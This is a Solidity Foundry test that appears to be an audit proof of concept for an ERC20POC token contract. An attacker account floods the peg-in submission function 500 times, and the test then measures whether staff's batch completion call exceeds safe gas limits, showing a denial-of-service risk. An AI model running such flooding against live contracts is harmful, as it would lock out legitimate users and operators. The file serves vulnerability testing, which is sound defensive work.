// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ERC20POC.sol";

contract GasLimitTest is Test {
    ERC20POC token;
    address owner = makeAddr("owner");
    address staff = makeAddr("staff");
    address attacker = makeAddr("attacker");
    bytes32[] pendingIds;
    uint256 startTimestamp;

    function setUp() public {
        startTimestamp = block.timestamp;
        vm.startPrank(owner);
        token = new ERC20POC(
            500, // fee_rate (0.5%)
            0,   // locking_POC
            staff, 
            0,   // new_staff_locked_POC
            type(uint256).max, // disable daily limits
            type(uint256).max
        );
        token.arr_pegin_submit_key_start_set(1);
        vm.stopPrank();

        vm.prank(owner);
        token.transfer(attacker, 10000 ether);
    }

    function test_peginCompleteGasLimit() public {
        console.log("--- PRE-Trigger: Create submissions ---");
        console.log("Creating 500 pending submissions...");
        
        // Attacker floods system with submissions
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 500; i++) {
            vm.warp(startTimestamp + i);
            token.pegin_submit(1);
            
            bytes32 id = keccak256(abi.encodePacked(startTimestamp + i, attacker));
            pendingIds.push(id);
        }
        vm.stopPrank();
        console.log("Submissions created. Pending IDs count:", pendingIds.length);
        
        console.log("--- TRIGGER: Process all submissions ---");
        // Staff processes all submissions in single call
        vm.startPrank(staff);
        uint256 gasStart = gasleft();
        token.pegin_submit_complete(pendingIds);
        uint256 gasUsed = gasStart - gasleft();
        vm.stopPrank();

        console.log("--- POST-Trigger: Gas measurement ---");
        console.log("Gas consumed for batch processing:", gasUsed);
        
        // Final vulnerability determination
        if (gasUsed > 10_000_000) {
            console.log("Vulnerability Exists: Gas consumption exceeds safe limits indicating DoS risk");
        } else {
            console.log("Vulnerability not Exist: Gas consumption within acceptable parameters");
        }
    }
}